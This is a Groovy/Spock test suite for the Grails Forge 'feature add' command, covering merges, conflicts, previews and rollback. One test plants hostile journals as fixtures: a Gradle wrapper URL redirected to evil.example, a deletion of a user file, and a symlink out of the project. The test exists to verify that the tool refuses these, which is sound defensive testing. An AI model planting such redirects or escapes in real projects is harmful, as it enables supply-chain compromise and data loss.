/*
 *  Licensed to the Apache Software Foundation (ASF) under one
 *  or more contributor license agreements.  See the NOTICE file
 *  distributed with this work for additional information
 *  regarding copyright ownership.  The ASF licenses this file
 *  to you under the Apache License, Version 2.0 (the
 *  "License"); you may not use this file except in compliance
 *  with the License.  You may obtain a copy of the License at
 *
 *    https://www.apache.org/licenses/LICENSE-2.0
 *
 *  Unless required by applicable law or agreed to in writing,
 *  software distributed under the License is distributed on an
 *  "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
 *  KIND, either express or implied.  See the License for the
 *  specific language governing permissions and limitations
 *  under the License.
 */
package org.grails.forge.cli.command

import java.nio.file.Files
import java.nio.file.LinkOption
import java.nio.file.attribute.PosixFilePermissions
import java.security.MessageDigest
import java.util.zip.ZipEntry
import java.util.zip.ZipInputStream
import org.apache.grails.forge.core.change.FeatureAddition
import org.apache.grails.forge.core.state.ProjectLock
import org.apache.grails.forge.core.state.ProjectState
import org.grails.forge.application.ApplicationType
import org.grails.forge.application.OperatingSystem
import org.grails.forge.application.generator.ProjectGenerator
import org.grails.forge.cli.CliRunner
import org.grails.forge.cli.CommandFixture
import org.grails.forge.cli.CommandSpec
import org.grails.forge.cli.ForgeCli
import org.grails.forge.cli.ForgeCommand
import org.grails.forge.io.ConsoleOutput
import org.grails.forge.io.ZipOutputHandler
import org.grails.forge.options.Options
import org.grails.forge.util.NameUtils
import org.grails.forge.util.VersionInfo
import spock.lang.Unroll

class FeatureAddCommandSpec extends CommandSpec implements CommandFixture {

    PrintStream originalOut
    PrintStream originalErr
    ByteArrayOutputStream out = new ByteArrayOutputStream()
    ByteArrayOutputStream err = new ByteArrayOutputStream()

    /** Where the application is created with the feature, to compare with */
    File with

    File home
    String previousHome

    void setup() {
        originalOut = System.out
        originalErr = System.err
        System.setOut(new PrintStream(out))
        System.setErr(new PrintStream(err))
        with = Files.createTempDirectory('grailsforgewith').toFile()
        // the journal of a change is kept in the home directory of whoever runs the command
        home = Files.createTempDirectory('grailsforgehome').toFile()
        previousHome = System.getProperty('user.home')
        System.setProperty('user.home', home.absolutePath)
    }

    void cleanup() {
        System.setOut(originalOut)
        System.setErr(originalErr)
        System.setProperty('user.home', previousHome)
        with.deleteDir()
        home.deleteDir()
    }

    @Unroll
    void "#feature is added to what #command.simpleName #created made as if it had been created with it"() {
        given:
        create(dir, command, created)
        create(with, command, created + ['--features', feature])

        when:
        int exit = add(feature)

        then:
        exit == 0
        err.toString().isEmpty()
        out.toString().contains("Feature ${feature} added. Commit the changes together with the directory .grails")

        and: 'every file is the file of the application that was created with the feature, the state among them'
        tree(dir) == tree(with)

        and: 'nothing is left of the change, in the application or in the home directory'
        new File(dir, '.grails/transactions').list() as List == ['lock']
        !new File(home, '.grails/forge/transactions').list()

        and:
        ProjectState.read(dir.toPath()).verifyBaseline(dir.toPath())
        ProjectState.read(dir.toPath()).manifest.requestedFeatures*.name.contains(feature)

        where:
        command                | created                                                 | feature
        CreateAppCommand       | []                                                      | 'grails-quartz'
        CreateAppCommand       | []                                                      | 'asciidoctor'
        CreateAppCommand       | []                                                      | 'grails-web-console'
        CreateAppCommand       | []                                                      | 'grails-spring-security'
        CreateAppCommand       | []                                                      | 'database-migration'
        CreateAppCommand       | []                                                      | 'gorm-mongodb'
        CreateAppCommand       | ['--servlet', 'undertow', '--data', 'mongodb']          | 'grails-quartz'
        CreateAppCommand       | ['--data', 'hibernate7', '--jdk', '25']                 | 'hibernate-validator'
        CreateAppCommand       | ['--reloading', 'none', '--servlet', 'jetty']           | 'cache'
        CreateAppCommand       | ['--exclude-features', 'mockito,scaffolding']           | 'openapi'
        CreateRestApiCommand   | []                                                      | 'grails-quartz'
        CreateRestApiCommand   | []                                                      | 'openapi'
        CreateRestApiCommand   | ['--exclude-features', 'mockito']                       | 'asciidoctor'
        CreatePluginCommand    | []                                                      | 'asciidoctor'
        CreatePluginCommand    | []                                                      | 'grails-quartz'
        CreateWebPluginCommand | []                                                      | 'grails-quartz'
        CreateWebPluginCommand | []                                                      | 'asciidoctor'
    }

    void "a feature is added to an application that has features that were asked for, and brings what it requires"() {
        given:
        create(dir, CreateAppCommand, ['--features', 'grails-web-console,database-migration'])
        create(with, CreateAppCommand, ['--features', 'grails-web-console,database-migration,spring-ai-ollama'])

        when:
        int exit = add('spring-ai-ollama')

        then:
        exit == 0
        out.toString().contains('Adding the feature spring-ai-ollama, and with it grails-spring-ai')
        tree(dir) == tree(with)
        ProjectState.read(dir.toPath()).manifest.requestedFeatures*.name == ['database-migration', 'grails-web-console', 'spring-ai-ollama']
    }

    void "several features are added at once"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz,asciidoctor'])

        when:
        int exit = add('grails-quartz,asciidoctor')

        then:
        exit == 0
        out.toString().contains('Features grails-quartz, asciidoctor added')
        tree(dir) == tree(with)
    }

    void "what was changed and added in the application is kept"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])
        File bootStrap = new File(dir, 'grails-app/init/com/example/BootStrap.groovy')
        bootStrap << '// mine\n'
        new File(dir, 'src/main/groovy/com/example').mkdirs()
        new File(dir, 'src/main/groovy/com/example/Mine.groovy').text = 'package com.example\n\nclass Mine {}\n'
        new File(dir, 'grails-app/conf/logback-spring.xml').delete()

        when:
        int exit = add('grails-quartz')

        then:
        exit == 0
        bootStrap.text.endsWith('// mine\n')
        new File(dir, 'src/main/groovy/com/example/Mine.groovy').exists()
        !new File(dir, 'grails-app/conf/logback-spring.xml').exists()

        and: 'every other file is as in the application that was created with the feature'
        List<String> mine = ['grails-app/init/com/example/BootStrap.groovy', 'src/main/groovy/com/example/Mine.groovy', 'grails-app/conf/logback-spring.xml']
        tree(dir).findAll { !(it.key in mine) && !it.value.startsWith('directory') } == tree(with).findAll { !(it.key in mine) && !it.value.startsWith('directory') }
    }

    void "a file that was changed gets what the feature changes in it and keeps its changes"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])
        File build = new File(dir, 'build.gradle')
        build.text = '// our build\n' + build.text + "\ntasks.register('mine')\n"
        File config = new File(dir, 'grails-app/conf/application.yml')
        config.text = 'mine:\n  first: true\n' + config.text

        when:
        int exit = add('grails-quartz')

        then:
        exit == 0
        out.toString().contains('    merge    build.gradle (your changes are kept)')
        out.toString().contains('    merge    grails-app/conf/application.yml (your changes are kept)')
        out.toString().contains('    update   README.md')
        build.text == '// our build\n' + new File(with, 'build.gradle').text + "\ntasks.register('mine')\n"
        build.text.contains('implementation "org.apache.grails:grails-quartz"')
        config.text == 'mine:\n  first: true\n' + new File(with, 'grails-app/conf/application.yml').text

        and: 'the baseline is what the generator writes, not what the application has'
        new File(dir, '.grails/baseline/files/build.gradle').bytes == new File(with, 'build.gradle').bytes
        tree(dir).findAll { it.key.startsWith('.grails/') } == tree(with).findAll { it.key.startsWith('.grails/') }
    }

    void "a change the feature makes where the application was changed is a conflict, and nothing is written"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])
        File build = new File(dir, 'build.gradle')
        List<String> generated = build.readLines()
        List<String> withFeature = new File(with, 'build.gradle').readLines()
        int where = (0..<generated.size()).find { generated[it] != withFeature[it] }
        String original = build.text
        build.text = (generated.take(where) + ['    implementation "com.acme:mine:1.0"'] + generated.drop(where)).join('\n') + '\n'
        new File(dir, 'README.md').text = 'Our notes\n\n' + new File(dir, 'README.md').text
        new File(dir, 'grails-app/init/com/example/BootStrap.groovy') << '// ours\n'
        Map<String, String> before = tree(dir)

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        out.toString().contains('    conflict build.gradle: the feature changes lines of this file that were changed in the project too, or lines next to them\n' +
                "             at line ${where + 1} the project has:\n" +
                '                     implementation "com.acme:mine:1.0"\n' +
                '             and the feature has there:\n' +
                '                     implementation "org.apache.grails:grails-quartz"\n' +
                '             Both changed the same place, so neither is taken for the other. Move the lines of the project that are shown to another place ' +
                'of the file, with an unchanged line that is like no other line between (or take them out), add the feature again, and then put them where they belong\n')
        out.toString().contains('    merge    README.md (your changes are kept)')
        out.toString().contains('    update   grails-app/conf/application.yml')
        err.toString().contains('The feature was not added: 1 file cannot be written without losing what the application has. Nothing was changed. ' +
                'What is in the way is said with each file; --diff shows what the feature would change. Make room for it and add the feature again')

        and: 'no file of the application or of its state is another, and none was added'
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()

        when: 'the change the feature would have made is shown'
        out.reset()
        int shown = add('grails-quartz', '--diff')

        then:
        shown == 1
        out.toString().contains('rejected: build.gradle (the feature changes lines of this file that were changed in the project too, or lines next to them)')
        out.toString().contains('+    implementation "org.apache.grails:grails-quartz"')
        out.toString().contains('--- a/grails-app/conf/application.yml')
        out.toString().contains('+quartz.autoStartup: true')
        tree(dir) == before

        when: 'room is made for the feature, and it is added again'
        build.text = original + '\ndependencies {\n    implementation "com.acme:mine:1.0"\n}\n'
        err.reset()
        int again = add('grails-quartz')

        then:
        again == 0
        err.toString().isEmpty()
        build.text == new File(with, 'build.gradle').text + '\ndependencies {\n    implementation "com.acme:mine:1.0"\n}\n'
        new File(dir, 'README.md').text.startsWith('Our notes\n')
        new File(dir, 'README.md').text.contains('## Feature grails-quartz documentation')
        new File(dir, 'grails-app/init/com/example/BootStrap.groovy').text.endsWith('// ours\n')
        tree(dir).findAll { it.key.startsWith('.grails/') } == tree(with).findAll { it.key.startsWith('.grails/') }
    }

    void "a file the feature changes that was removed from the application is a conflict"() {
        given:
        create(dir, CreateAppCommand, [])
        new File(dir, 'grails-app/conf/application.yml').delete()
        Map<String, String> before = tree(dir)

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        out.toString().contains('    conflict grails-app/conf/application.yml: the feature changes this file, and it was removed from the project')
        tree(dir) == before
    }

    void "a file the feature adds that is there already is a conflict, unless it is the file the feature writes"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'asciidoctor'])
        new File(dir, 'gradle/asciidoc.gradle').text = '// ours\n'
        new File(dir, 'src/docs/asciidoc').mkdirs()
        new File(dir, 'src/docs/asciidoc/index.adoc').bytes = new File(with, 'src/docs/asciidoc/index.adoc').bytes
        Map<String, String> before = tree(dir)

        when:
        int exit = add('asciidoctor')

        then:
        exit == 1
        out.toString().contains('    conflict gradle/asciidoc.gradle: the feature adds this file, and the project has another file of its name')
        out.toString().contains('    keep     src/docs/asciidoc/index.adoc (it is what the feature makes it already)')
        tree(dir) == before

        when:
        new File(dir, 'gradle/asciidoc.gradle').delete()
        int again = add('asciidoctor')

        then:
        again == 0
        tree(dir) == tree(with)
    }

    void "a feature the application has is not added again, and nothing is changed"() {
        given:
        create(dir, CreateAppCommand, [])

        expect:
        add('grails-quartz') == 0

        when:
        Map<String, String> before = tree(dir)
        out.reset()
        int exit = add('grails-quartz')

        then:
        exit == 0
        out.toString().contains('The application already has the feature grails-quartz')
        out.toString().contains('Nothing was changed')
        tree(dir) == before

        when: 'a feature every application has'
        out.reset()
        int ofTheApplication = add('gsp')

        then:
        ofTheApplication == 0
        out.toString().contains('The application already has the feature gsp')
        tree(dir) == before
    }

    void "what would be done is said and not done with --dry-run, and shown with --diff"() {
        given:
        create(dir, CreateAppCommand, [])
        Map<String, String> before = tree(dir)

        when:
        int exit = add('asciidoctor', '--dry-run')

        then:
        exit == 0
        out.toString().contains('To add the feature asciidoctor')
        out.toString().contains('    add      gradle/asciidoc.gradle')
        out.toString().contains('    update   build.gradle')
        out.toString().contains('Nothing was changed')
        !out.toString().contains('+++')
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()

        when:
        out.reset()
        int shown = add('asciidoctor', '--diff')

        then:
        shown == 0
        out.toString().contains('--- /dev/null')
        out.toString().contains('+++ b/gradle/asciidoc.gradle')
        out.toString().contains('--- a/build.gradle')
        out.toString().contains('+apply from: "gradle/asciidoc.gradle"')
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()
    }

    @Unroll
    void "adding #added to what create-app #created made is refused as creating it so is: #message"() {
        given:
        create(dir, CreateAppCommand, created)
        Map<String, String> before = tree(dir)
        int creating = create(with, CreateAppCommand, created.collect { it.startsWith('--features=') ? it + ',' + added : it } +
                (created.any { it.startsWith('--features=') } ? [] : ['--features=' + added]))
        String whenCreated = err.toString()
        err.reset()

        when:
        int exit = add(added)

        then:
        creating == 2
        exit == 2
        whenCreated.contains(message)
        err.toString().contains(message)
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()

        where:
        created                                 | added                    || message
        []                                      | 'no-such-feature'        || 'The requested feature does not exist: no-such-feature'
        ['--features=spring-ai-ollama']         | 'spring-ai-openai'       || 'spring-ai-ollama'
        ['--exclude-features', 'mockito']       | 'mockito'                || 'The feature mockito is both selected and excluded'
        ['--exclude-features', 'geb-with-testcontainers,scaffolding,spock'] | 'mockito' || 'Mockito requires JUnit or Spock'
    }

    @Unroll
    void "#added, which would take the place of what the application has, is not added to it"() {
        given:
        create(dir, CreateAppCommand, created)
        Map<String, String> before = tree(dir)

        when:
        int exit = add(added)

        then:
        exit == 1
        err.toString().contains(message)
        err.toString().contains("An application has it when it is created with it (--features ${added}")
        err.toString().contains("to change this application by hand, feature add ${added} --diff shows what would be added to its files and what would be removed")
        !out.toString().contains('update ')
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()

        when: 'what it would add and what it would take away is shown, and nothing is changed'
        out.reset()
        err.reset()
        int shown = add(added, '--diff')

        then:
        shown == 1
        err.toString().contains(message)
        out.toString().contains("To add the feature ${added}")
        out.toString().contains('    update   build.gradle')
        out.toString().contains(lost)
        shownInDiff.every { out.toString() =~ it }
        tree(dir) == before

        when:
        out.reset()
        int listed = add(added, '--dry-run')

        then:
        listed == 1
        out.toString().contains('    update   build.gradle')
        out.toString().contains(lost)
        !out.toString().contains('+++')
        tree(dir) == before

        where:
        created | added             || lost                                                     | shownInDiff                                                | message
        []      | 'gorm-hibernate7' || '    change   --data hibernate7 in the place of hibernate5' | [/(?m)^-.*hibernate5/, /(?m)^\+.*hibernate7/]                | 'Adding gorm-hibernate7 would change what the application was created with (--data hibernate7 in the place of hibernate5)'
        []      | 'postgres'        || '    remove   the feature h2'                               | [/(?m)^-.*h2/, /(?m)^\+.*postgresql/]                        | 'Adding postgres would take the feature h2 out of the application: a feature that replaces another cannot be added to an application.'
        []      | 'grails-layout'   || '    remove   the feature sitemesh3'                        | [/(?m)^-.*sitemesh/, /(?m)^\+.*layout/]                      | 'Adding grails-layout would take the feature sitemesh3 out of the application: a feature that replaces another cannot be added to an application.'
    }

    @Unroll
    void "#what that comes with a project makes the command write nothing"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])
        new File(dir, 'secret.txt').text = 'the user wrote this\n'
        File outside = new File(home, 'outside')
        outside.mkdirs()
        new File(outside, '0').text = 'a file of the user outside the project\n'
        hostile.call(dir, outside)
        Map<String, String> before = tree(dir)
        Map<String, String> beside = tree(outside)

        when: 'a command that is refused, which once undid what such a journal named before it looked at anything'
        int refused = add('no-such-feature')

        then:
        refused == 2
        tree(dir) == before
        tree(outside) == beside
        out.toString().contains(".grails/transactions has ${left}, which no change that this user began under this home directory and for this path of the project " +
                'left there: it was not read and is left alone.')

        when: 'and a command that adds a feature'
        out.reset()
        int exit = add('grails-quartz')

        then:
        exit == 0
        out.toString().contains(".grails/transactions has ${left}, which no change that this user began")
        tree(outside) == beside
        new File(dir, 'secret.txt').text == 'the user wrote this\n'
        new File(dir, 'gradle/wrapper/gradle-wrapper.properties').bytes == new File(with, 'gradle/wrapper/gradle-wrapper.properties').bytes
        tree(dir).findAll { !it.key.startsWith('.grails/transactions/') && it.key != 'secret.txt' } == tree(with)

        and: 'what came with the project is where it was'
        tree(dir).findAll { it.key.startsWith('.grails/transactions/') } == before.findAll { it.key.startsWith('.grails/transactions/') }

        where:
        what                                                            | left      | hostile
        'a journal that names a file to replace, with the replacement'  | 'current' | { File project, File elsewhere ->
            byte[] evil = 'distributionUrl=https\\://evil.example/gradle.zip\n'.bytes
            journal(project, 'current', 'grails-forge-transaction 1', ["put 0 ${sha(evil)} ${sha(new File(project, 'gradle/wrapper/gradle-wrapper.properties').bytes)} gradle/wrapper/gradle-wrapper.properties"], [0: evil])
        }
        'a journal that names a file of the user to remove'             | 'current' | { File project, File elsewhere ->
            journal(project, 'current', 'grails-forge-transaction 1', ["put 0 - ${sha(new File(project, 'secret.txt').bytes)} secret.txt"], [:])
        }
        'a journal that names the manifest to replace'                  | 'current' | { File project, File elsewhere ->
            byte[] evil = 'format: 1\n'.bytes
            journal(project, 'current', 'grails-forge-transaction 1', ["put 0 ${sha(evil)} ${sha(new File(project, '.grails/project.yml').bytes)} .grails/project.yml"], [0: evil])
        }
        'a journal whose copies are a link out of the project'          | 'current' | { File project, File elsewhere ->
            journal(project, 'current', 'grails-forge-transaction 1', ["put 0 ${sha(new File(elsewhere, "0").bytes)} ${sha(new File(project, "README.md").bytes)} README.md"], [:])
            new File(project, '.grails/transactions/current/backup').deleteDir()
            Files.createSymbolicLink(new File(project, '.grails/transactions/current/backup').toPath(), elsewhere.toPath())
        }
        'a journal as this version writes it, in the project'           | 'journal, t0123456789abcdef01234567' | { File project, File elsewhere ->
            byte[] evil = 'distributionUrl=https\\://evil.example/gradle.zip\n'.bytes
            journal(project, 't0123456789abcdef01234567', "grails-forge-transaction 2\nproject ${project.toPath().toRealPath()}\nid t0123456789abcdef01234567",
                    ["put 0 ${sha(evil)} ${sha(new File(project, 'gradle/wrapper/gradle-wrapper.properties').bytes)} gradle/wrapper/gradle-wrapper.properties"], [0: evil])
            Files.copy(new File(project, '.grails/transactions/t0123456789abcdef01234567/journal').toPath(), new File(project, '.grails/transactions/journal').toPath())
        }
    }

    @spock.lang.IgnoreIf({ os.windows })
    @spock.lang.Timeout(value = 900, unit = java.util.concurrent.TimeUnit.SECONDS)
    void "a pipe where the lock of the project is makes the command end, with nothing changed"() {
        given:
        create(dir, CreateAppCommand, [])
        new File(dir, '.grails/transactions').mkdirs()
        Process made = new ProcessBuilder('mkfifo', new File(dir, '.grails/transactions/lock').absolutePath).start()

        expect:
        made.waitFor() == 0

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains('The lock of the project, .grails/transactions/lock, is not a file; remove it. Nothing of the project was changed')
        !new File(dir, 'build.gradle').text.contains('grails-quartz')
        !new File(home, '.grails/forge/transactions').list()
    }

    void "without a home directory nothing is added, and what a project has where a relative one would be is not read"() {
        given:
        create(dir, CreateAppCommand, [])
        Map<String, String> before = tree(dir)
        System.setProperty('user.home', '?')

        when: 'what would be done is still said'
        int preview = add('grails-quartz', '--dry-run')

        then:
        preview == 0
        out.toString().contains('To add the feature grails-quartz')

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains('Adding a feature needs a home directory to keep the record of the change in, and the one the system property user.home names ' +
                'cannot be used: it is not an absolute path. Nothing of the project was changed')
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()
    }

    void "a change that was interrupted is undone by the next command, which says which files it put back"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])
        Map<String, String> before = tree(dir)
        FeatureAddition addition = new FeatureAddition(beanContext.getBean(ProjectGenerator))
        try {
            addition.plan(dir.toPath(), ['grails-quartz'], OperatingSystem.LINUX, ConsoleOutput.NOOP).apply { String path ->
                if (path == 'build.gradle') {
                    throw new IllegalStateException('the program ended')
                }
            }
        } catch (IllegalStateException ignored) {
        }

        expect:
        tree(dir) != before
        new File(home, '.grails/forge/transactions').list().size() == 1

        when: 'nothing is looked at while the application is half changed'
        int preview = add('grails-quartz', '--dry-run')

        then:
        preview == 1
        err.toString().contains('An earlier change of the project was interrupted; it is undone when a feature is added without --dry-run and --diff')
        tree(dir) != before

        when:
        int exit = add('grails-quartz')

        then:
        exit == 0
        out.toString().contains('An earlier change of the application that was interrupted was undone. 2 files were put back as they were: README.md, build.gradle')
        out.toString().contains('Feature grails-quartz added')
        tree(dir) == tree(with)
        !new File(home, '.grails/forge/transactions').list()
    }

    void "the feature of a plugin is not added by the coordinates of the plugin"() {
        given:
        create(dir, CreateAppCommand, [])
        Map<String, String> before = tree(dir)

        when:
        int exit = add('com.acme:acme-audit-grails:2.3.0')

        then:
        exit == 2
        err.toString().contains('com.acme:acme-audit-grails:2.3.0 is no name of a feature of Grails')
        tree(dir) == before
    }

    void "a directory without the state of a generated application is refused"() {
        given:
        new File(dir, 'build.gradle').text = '// an application of another making\n'

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains('There is no application here that a feature can be added to: .grails/project.yml is missing')
        dir.list() as List == ['build.gradle']
    }

    @Unroll
    void "an application whose state #what is refused"() {
        given:
        create(dir, CreateAppCommand, [])
        change.call(dir)
        Map<String, String> before = tree(dir)

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains(message)
        tree(dir) == before
        !new File(dir, '.grails/transactions').exists()

        where:
        what                             | change                                                                                   || message
        'has a lock that was edited'     | { File it -> File lock = new File(it, '.grails/forge.lock.yml'); lock.text = lock.text.replace('grails-web', 'grails-wex') } || '.grails/forge.lock.yml'
        'has no lock'                    | { File it -> new File(it, '.grails/forge.lock.yml').delete() }                           || 'The state of the project is not complete: .grails/forge.lock.yml is missing'
        'has a manifest that was edited' | { File it -> new File(it, '.grails/project.yml') << 'requestedFeatures: []\n' }          || '.grails/project.yml'
        'lacks a file of the baseline'   | { File it -> new File(it, '.grails/baseline/files/build.gradle').delete() }              || '.grails/baseline/files/build.gradle is missing from the baseline'
        'has a baseline that was edited' | { File it -> new File(it, '.grails/baseline/files/build.gradle') << '// edited\n' }      || '.grails/baseline/files/build.gradle is not what the generator wrote'
        'has another file in its baseline' | { File it -> new File(it, '.grails/baseline/files/extra.txt').text = 'x' }             || '.grails/baseline/files/extra.txt is not a file of the baseline index'
    }

    void "an application that another version generated is sent to the command line of that version"() {
        given:
        create(dir, CreateAppCommand, [])
        ProjectLock lock = ProjectState.read(dir.toPath()).lock
        new File(dir, '.grails/forge.lock.yml').bytes = new ProjectLock(lock.manifestSha256, lock.generatorName, '9.0.0-M1', lock.grailsVersion, lock.templateApi,
                lock.applicationType, lock.options, lock.lineEndings, lock.repositories, lock.repositoriesNotNamed, lock.features, lock.parameters,
                lock.baselineIndexSha256).toBytes()
        Map<String, String> before = tree(dir)

        expect: 'the state reads'
        ProjectState.read(dir.toPath()).lock.generatorVersion == '9.0.0-M1'

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains("The application was generated by grails-forge 9.0.0-M1 for Grails ${VersionInfo.grailsVersion}, and this is grails-forge ${VersionInfo.version} " +
                "for Grails ${VersionInfo.grailsVersion}: a feature is added by the version the application was generated with. " +
                'Use the command line of Grails 9.0.0-M1 to add the feature')
        tree(dir) == before

        and: 'also when nothing would be written'
        add('grails-quartz', '--dry-run') == 1
    }

    void "an application with the feature of a pack that is not of Grails is refused"() {
        given:
        File pack = Files.createTempDirectory(with.toPath(), 'pack').toFile()
        new File(pack, 'templates').mkdirs()
        new File(pack, 'feature.yml').setText('format: 1\nkind: feature\ntemplateApi: 1\nname: acme-audit\n' +
                "compatibility:\n  grails: '[9.0.0,10.0.0)'\n  forge: '[9.0.0,10.0.0)'\n" +
                "files:\n  - from: audit.txt\n    to: 'grails-app/conf/audit.txt'\n", 'UTF-8')
        new File(pack, 'templates/audit.txt').setText('kept as it is', 'UTF-8')
        create(dir, CreateAppCommand, ['--features', 'acme-audit', '--feature-pack-dir', pack.absolutePath])
        Map<String, String> before = tree(dir)

        when:
        int exit = add('grails-quartz')

        then:
        exit == 1
        err.toString().contains('The application has the feature acme-audit of a feature pack that is not part of Grails; a feature cannot yet be added to such an application')
        tree(dir) == before
    }

    void "a clone whose text files have the line endings of Windows gets the feature with them"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'asciidoctor'])
        ProjectState state = ProjectState.read(dir.toPath())
        List<String> text = state.baseline.files.findAll { !it.binary }*.path
        for (String path : text) {
            File file = new File(dir, path)
            file.bytes = file.getText('UTF-8').replace('\n', '\r\n').getBytes('UTF-8')
        }
        new File(dir, 'build.gradle').text = '// ours\r\n' + new File(dir, 'build.gradle').getText('UTF-8')

        expect:
        text.every { state.isAsGenerated(dir.toPath(), it) || it == 'build.gradle' }

        when:
        int exit = add('asciidoctor')

        then:
        exit == 0
        out.toString().contains('    merge    build.gradle (your changes are kept)')

        and: 'the files that were changed have the line endings they had'
        new File(dir, 'build.gradle').getText('UTF-8') == '// ours\r\n' + new File(with, 'build.gradle').getText('UTF-8').replace('\n', '\r\n')

        and: 'a file that is new is as it is generated, and the baseline is that of the application that was created with the feature'
        new File(dir, 'gradle/asciidoc.gradle').bytes == new File(with, 'gradle/asciidoc.gradle').bytes
        tree(dir).findAll { it.key.startsWith('.grails/') } == tree(with).findAll { it.key.startsWith('.grails/') }

        and: 'every file but the one that was changed is as generated to the new state'
        ProjectState added = ProjectState.read(dir.toPath())
        added.baseline.files*.path.findAll { !added.isAsGenerated(dir.toPath(), it) } == ['build.gradle']
    }

    void "a feature is added to an application that was unpacked from the archive of the hosted Forge"() {
        given:
        ByteArrayOutputStream archive = new ByteArrayOutputStream()
        ZipOutputHandler zip = new ZipOutputHandler('shop', archive)
        beanContext.getBean(ProjectGenerator).generate(ApplicationType.WEB, NameUtils.parse('com.example.shop'), new Options(), OperatingSystem.LINUX,
                [], zip, ConsoleOutput.NOOP)
        new ZipInputStream(new ByteArrayInputStream(archive.toByteArray())).withCloseable { ZipInputStream input ->
            for (ZipEntry entry = input.nextEntry; entry != null; entry = input.nextEntry) {
                if (!entry.directory) {
                    File file = new File(dir, entry.name - 'shop/')
                    file.parentFile.mkdirs()
                    file.bytes = input.readAllBytes()
                }
            }
        }
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])

        when:
        int exit = add('grails-quartz')

        then:
        exit == 0
        tree(dir, false) == tree(with, false)
    }

    void "the command is feature add of the command line, which does not read the record of the code generation commands"() {
        given:
        create(dir, CreateAppCommand, [])
        create(with, CreateAppCommand, ['--features', 'grails-quartz'])

        expect:
        !ForgeCli.readsProject('feature', 'add', 'grails-quartz')

        when:
        int exit = CliRunner.run(ForgeCommand, beanContext, 'feature', 'add', 'grails-quartz')

        then:
        exit == 0
        tree(dir) == tree(with)

        when: 'no feature is named'
        int none = CliRunner.run(ForgeCommand, beanContext, 'feature', 'add')

        then:
        none == 2

        when: 'no command is named'
        int bare = CliRunner.run(ForgeCommand, beanContext, 'feature')

        then:
        bare == 2
        err.toString().contains('No command specified: feature add adds features to the application')
    }

    void "an application that was changed and got a feature is one Gradle builds"() {
        given:
        create(dir, CreateAppCommand, [])
        new File(dir, 'build.gradle') << "\ntasks.register('mine') {\n    doLast { println 'mine ran' }\n}\n"
        new File(dir, 'src/main/groovy/com/example').mkdirs()
        new File(dir, 'src/main/groovy/com/example/Mine.groovy').text = 'package com.example\n\nclass Mine {}\n'

        when:
        int exit = add('grails-quartz')

        then:
        exit == 0

        when: 'Gradle configures the build, resolves what it declares and compiles the application'
        System.setOut(originalOut)
        System.setErr(originalErr)
        executeGradleCommand('classes mine dependencies --configuration runtimeClasspath --console=plain')

        then:
        testOutputContains('org.apache.grails:grails-quartz')
        testOutputContains('mine ran')
        testOutputContains('BUILD SUCCESSFUL')
        new File(dir, 'build/classes/groovy/main/com/example/Mine.class').exists()
    }

    private int create(File directory, Class command, List<String> arguments) {
        String current = System.getProperty('user.dir')
        System.setProperty('user.dir', directory.absolutePath)
        try {
            return CliRunner.run(command, beanContext, (['com.example.shop', '--inplace'] + arguments) as String[])
        } finally {
            System.setProperty('user.dir', current)
        }
    }

    private int add(String... arguments) {
        return CliRunner.run(FeatureAddCommand, beanContext, arguments)
    }

    /**
     * Everything of a project: every directory with its mode, and every file with the digest of its
     * content and its mode, a link as a link. The directory of the changes and the lock in it are
     * left out, because a project has them once a feature was added to it and not before.
     */
    private static Map<String, String> tree(File project, boolean withModes = true) {
        Map<String, String> entries = new TreeMap<>()
        boolean posix = withModes && project.toPath().fileSystem.supportedFileAttributeViews().contains('posix')
        Files.walk(project.toPath()).withCloseable { stream ->
            stream.each { java.nio.file.Path path ->
                String name = project.toPath().relativize(path).join('/')
                if (name.isEmpty() || name == '.grails/transactions' || name == '.grails/transactions/lock') {
                    return
                }
                String mode = posix ? PosixFilePermissions.toString(Files.getPosixFilePermissions(path, LinkOption.NOFOLLOW_LINKS)) : ''
                if (Files.isSymbolicLink(path)) {
                    entries.put(name, "link to ${Files.readSymbolicLink(path)}".toString())
                } else if (Files.isDirectory(path, LinkOption.NOFOLLOW_LINKS)) {
                    entries.put(name, "directory ${mode}".toString())
                } else {
                    entries.put(name, "${sha(Files.readAllBytes(path))} ${mode}".toString())
                }
            }
        }
        return entries
    }

    private static String sha(byte[] bytes) {
        return MessageDigest.getInstance('SHA-256').digest(bytes).encodeHex().toString()
    }

    // a journal with the files it names, as it would come with a project
    private static void journal(File project, String name, String header, List<String> lines, Map<Integer, byte[]> copies) {
        File change = new File(project, ".grails/transactions/${name}")
        new File(change, 'backup').mkdirs()
        new File(change, 'new').mkdirs()
        copies.each { Integer index, byte[] content -> new File(change, "backup/${index}").bytes = content }
        new File(change, 'journal').text = ([header] + lines + ['end']).join('\n') + '\n'
    }
}
